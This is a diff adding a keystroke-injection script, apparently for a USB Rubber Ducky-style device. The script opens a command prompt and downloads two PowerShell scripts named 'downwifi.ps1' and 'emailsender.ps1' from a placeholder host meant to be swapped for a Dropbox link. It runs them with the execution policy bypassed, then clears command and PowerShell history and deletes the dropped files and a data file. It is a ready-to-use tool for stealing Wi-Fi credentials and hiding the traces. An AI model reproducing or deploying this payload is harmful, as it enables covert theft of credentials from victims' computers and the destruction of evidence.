@@ -1,0 +1,65 @@
+DELAY 1000
+REM open CMD(without admin)
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+
+DELAY 500
+REM download ps1 file (for me its "downwifi.ps1", if you want to change name you got to change it in other files also)
+REM CHANGE EXAMPLE.COM to your ps1 file (I used dropbox)
+STRING powershell -Command "(New-Object Net.WebClient).DownloadFile('https://WWW.EXAMPLE.COM', 'C:\\Windows\\Temp\\downwifi.ps1')"
+ENTER
+
+DELAY 2000
+REM starts downwifi.ps1
+STRING powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\downwifi.ps1
+ENTER
+
+DELAY 500
+REM download emailsender.ps1
+REM change EXAMPLE.COM to your dropbox link
+STRING powershell -Command "(New-Object Net.WebClient).DownloadFile('https://WWW.EXAMPLE.COM', 'C:\\Windows\\Temp\\emailsender.ps1')"
+ENTER
+
+DELAY 4000
+REM starts emailsender.ps1
+STRING powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\emailsender.ps1
+ENTER
+
+DELAY 500
+REM clear cmd history
+STRING doskey /reinstall
+DELAY 500
+ENTER
+DELAY 500
+ALT F4
+
+DELAY 2000
+REM runs powershell (admin) to del files
+GUI x
+DELAY 500
+STRING a
+DELAY 500
+LEFT_ARROW
+DELAY 500
+ENTER
+DELAY 500
+REM Usuwa pliki downwifi.ps1, emailsender.ps1 oraz data123.txt
+STRING powershell -Command "if (Test-Path 'C:\\Windows\\Temp\\downwifi.ps1') {Remove-Item 'C:\\Windows\\Temp\\downwifi.ps1'}"
+ENTER
+DELAY 500
+STRING powershell -Command "if (Test-Path 'C:\\Windows\\Temp\\emailsender.ps1') {Remove-Item 'C:\\Windows\\Temp\\emailsender.ps1'}"
+ENTER
+DELAY 500
+STRING powershell -Command "if (Test-Path 'C:\\Windows\\Temp\\data123.txt') {Remove-Item 'C:\\Windows\\Temp\\data123.txt'}"
+ENTER
+
+DELAY 500
+REM clear powershell history
+STRING Clear-History
+ENTER
+
+DELAY 500
+REM close cmd
+ALT F4
